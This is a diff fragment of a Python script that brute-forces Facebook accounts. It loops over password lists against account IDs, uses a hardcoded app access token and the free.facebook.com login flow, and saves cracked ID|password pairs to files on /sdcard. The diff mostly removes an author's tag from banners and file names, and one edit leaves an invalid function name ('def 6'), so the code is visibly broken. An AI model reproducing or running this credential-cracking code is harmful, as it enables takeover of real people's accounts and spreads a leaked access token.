-        sys.stdout.write('\r\r\033[1;37m [SALMANXESHO-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -1494,8 +1495,8 @@ def SALMANXESHO5(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [SALMANXESHO-OK] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/SALMANXESHO-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -1505,8 +1506,8 @@ def SALMANXESHO5(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\x1b[38;5;205m [SALMANXESHO-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/SALMANXESHO-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;205m [-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
@@ -1514,12 +1515,12 @@ def SALMANXESHO5(ids,passlist):
         except Exception as e:
                 pass
 #method6
-def SALMANXESHO6(ids,passlist):
+def 6(ids,passlist):
 	global loop
 	global oks
 	try:
 		for pas in passlist:
-			sys.stdout.write('\r\r\033[1;37m [SALMANXESHO-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+			sys.stdout.write('\r\r\033[1;37m [-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 			session = requests.Session()
 			ua = random.choice(ugen)
 			free_fb = session.get('https://free.facebook.com').text
@@ -1560,10 +1561,10 @@ def SALMANXESHO6(ids,passlist):
 				if uid in oks:pass
 				else:
 					if 'checkpoint' in str(lo):
-						print('\r\r\033[1;34m [SALMANXESHO-2F] '+uid+' | '+pas)
+						print('\r\r\033[1;34m [-2F] '+uid+' | '+pas)
 					else:
-						print(f'\r\x1b[1;32m [SALMANXESHO-OK] '+uid+' | '+pas)
-						open('/sdcard/SALMANXESHO-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
+						print(f'\r\x1b[1;32m [-OK] '+uid+' | '+pas)
+						open('/sdcard/-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
 						oks.append(uid)
 						break
 			elif 'checkpoint' in log_cookies:
@@ -1571,8 +1572,8 @@ def SALMANXESHO6(ids,passlist):
 				uid=coki[141:156]
 				if uid in cps:pass
 				else:
-					print('\r\r\x1b[38;5;205m [SALMANXESHO-CP] '+uid+' | '+pas+'\033[1;97m')
-					open('/sdcard/SALMANXESHO-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
+					print('\r\r\x1b[38;5;205m [-CP] '+uid+' | '+pas+'\033[1;97m')
+					open('/sdcard/-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
 					cps.append(ids)
 					break
 			else:
